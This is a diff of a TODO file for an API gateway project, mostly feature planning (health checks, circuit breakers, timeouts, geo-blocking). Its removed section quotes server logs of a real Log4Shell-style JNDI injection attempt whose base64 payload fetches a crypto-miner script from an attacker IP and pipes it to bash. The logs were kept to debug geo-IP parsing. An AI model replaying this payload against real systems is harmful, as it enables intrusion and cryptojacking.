@@ -2,26 +2,15 @@
 
 # TODO tasks for the project
 
-# Request identifier and tracing
+## Remove prefix config
 
-OpenTelemetry + Open Telemetry server: https://opentelemetry.io/
+We assume "_" is the prefix for all gateway routes, no need to configure it.
+Using /_tg/ might be a good one so we see the name of the project everywhere.
 
-Should we add X-Request-ID to all requests and responses for tracing?
-Are there any other ways to trace requests?
-Are there libraries that already handle tracing?
-Do libraries stick to an specific tracing product or standard?
+## TO FIX
 
-## Logs
+- integration_ja4h_test.go really needed? if so, can be moved to a different place?
 
-Show logs in the dashboard
-* Filter logs by date range
-* Filter logs by severity level
-* Search logs by keyword
-
-## Stats
-
-* CPU usage
-* Memory usage
 
 # Health check 
 
@@ -111,34 +100,41 @@ Health check configuration for the routes configured in the gateway:
 * Integrate with cloud storage providers (e.g., AWS S3, Google Cloud Storage)
 
 
-# Fix GEO IP
+# Gateway feature gaps (vs. Kong/Traefik/nginx/Envoy/Tyk/KrakenD/APISIX/AWS API Gateway)
 
-These logs show on megabox-qa:
+Deep-dive comparison done 2026-08-28, checked against the actual code (not
+just recollection). Grouped by how load-bearing each feature is elsewhere;
+we're working through these one at a time — see status notes.
 
-```
-2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.271Z - 87.120.191.93:56554 "GET /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}')" 307 0.16ms
-2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
-2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.594Z - 87.120.191.93:56554 "GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D/31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z%7D%27%29" 404 0.10ms
-2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
-```
+## Tier 1 — near-universal, currently absent
 
-Why IP is not being parsed correctly? Is it because of the attack vector in the URL?
+- [ ] **Upstream health checks (active + passive)** for the load balancer
+      (`gateway/loadbalancer.go`). Today it only reacts to a failed connection
+      *during* a request — no background probing, no ejection of a backend
+      that's merely slow/5xx-ing. Natural precursor to the circuit breaker
+      already on the README roadmap.
+- [ ] **Circuit breaker** (already flagged 🚧 in README) — smaller lift than
+      full health checks: "stop trying this backend for N seconds after M
+      failures," reusing the round-robin transport's per-target failure count.
+- [ ] **Per-route timeouts.** No `Timeout` field in `config.RouteConfig`, and
+      no deadline set on the proxy's transport — a hung backend can hold a
+      request open indefinitely.
+- [ ] **Horizontal scalability of state.** Rate limiter is a plain in-memory
+      map; sessions live in SQLite with no Redis/shared-cache option anywhere
+      (`grep -r redis` turns up nothing). Running >1 taronja replica today
+      gives each instance its own rate-limit counters. Biggest architectural
+      gap of the list — needs a deliberate pluggable-store decision, not a
+      quick add.
 
-# Rate limiter
+## Tier 2 — very common, moderate lift, in-scope
 
-- Store persistent info about attackers (IP, user agent, etc.)
-    - Show blocked IPs (with start and end date of the block)
-    - Info about blocked IPs (number of requests, user agent, etc.), geo info, etc.
-    - Show a map of attackers by country
-- Request Details
-    - Show IP address
-    - Filter by IP address
-    - Filter Period: add "last week", "last month", "last year"
-    - Show user agent
-    - Show if URL matches any of the blocking rules
-    - Show the METHOD + PATH
-- Does JA4 fingerprinting make any sense at all?
-    - Can we use it to identify users?
-    - Can we identify bots?
-    - Can we identify returning users/attackers?
-    - Filter by JA4 fingerprint separate parts? 
+- [ ] **IP allow/deny lists and geo-blocking.** We already compute
+      geolocation for analytics (`session/ipgeo.go`) but nothing *acts* on it.
+- [ ] **Security response headers middleware** (HSTS, X-Frame-Options,
+      X-Content-Type-Options, CSP) — same shape as `cors.go`.
+- [ ] **Request body size limits** — no `MaxBytesReader`/content-length cap
+      anywhere, including on the load balancer's body-buffering retry path.
+- [ ] **Dynamic upstream discovery** (DNS SRV, Consul, Kubernetes
+      Endpoints/EndpointSlice) instead of a static `to:` list.
+
+
